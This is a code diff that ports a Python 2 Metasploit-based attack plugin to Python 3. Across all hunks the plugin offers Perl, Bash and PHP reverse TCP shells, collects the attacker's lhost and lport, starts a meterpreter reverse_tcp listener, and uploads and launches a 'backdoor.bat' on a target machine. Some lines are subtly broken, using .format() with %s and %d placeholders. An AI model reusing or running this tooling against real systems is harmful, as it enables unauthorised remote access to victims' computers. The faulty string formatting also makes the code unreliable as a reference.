@@ -70,7 +70,7 @@ class msf(basePlugin):
     	print("1) Perl reverse tcp")
     	print("2) Bash reverse tcp")
     	print("3) PHP reverse tcp")
-    	result=raw_input("Choose your payload: ")
+    	result=input("Choose your payload: ")
     	if int(result) == 1:
     		self.isShellCode=True
     		msfObj.linuxPerlReverseShell(lhost,lport)
@@ -98,9 +98,9 @@ class msf(basePlugin):
 
 
     def get_parameters(self):
-		self.lhost=raw_input("Please, introduce lhost: ")
+		self.lhost=input("Please, introduce lhost: ")
 		self.lhost=self.lhost.strip("\n")
-		self.lport=raw_input("Please, introduce lport: ")
+		self.lport=input("Please, introduce lport: ")
 		self.lport=self.lport.strip("\n")
 		self.password=getpass.getpass("Please, introduce the password for msfconsole: ")
 
@@ -110,12 +110,12 @@ class msf(basePlugin):
 		Listener.setLhost(self.lhost)
 		Listener.setLport(self.lport)
 		Listener.setPayload(payload)
-		print("Creating listener... "
+		print("Creating listener... ")
 		try:
 			Listener.login()
 			Listener.launchHandler()
-			print("Listener created: PAYLOAD:%s  LHOST:%s LPORT:%s ".format(Listener.getPayload(),Listener.getLhost(),Listener.getLport()))
-		except MsfXmlRpcListenerErr,err:
+			print(("Listener created: PAYLOAD:%s  LHOST:%s LPORT:%s ".format(Listener.getPayload(),Listener.getLhost(),Listener.getLport())))
+		except MsfXmlRpcListenerErr as err:
 		        print(err)
 	
         
@@ -162,7 +162,7 @@ class msf(basePlugin):
             	dest = tmpDir+"\\backdoor.bat"
             	bytes = haxhelper.uploadfile(tmpPayload, dest, -1)
 		os.remove(tmpPayload)
-            	print("%d bytes written to '%s'.".format(bytes, dest))
+            	print(("%d bytes written to '%s'.".format(bytes, dest)))
 		self.set_listener("windows/meterpreter/reverse_tcp")
             	print("Launching now...")
             	command = haxhelper.concatCommands(("cd "+tmpDir, dest))
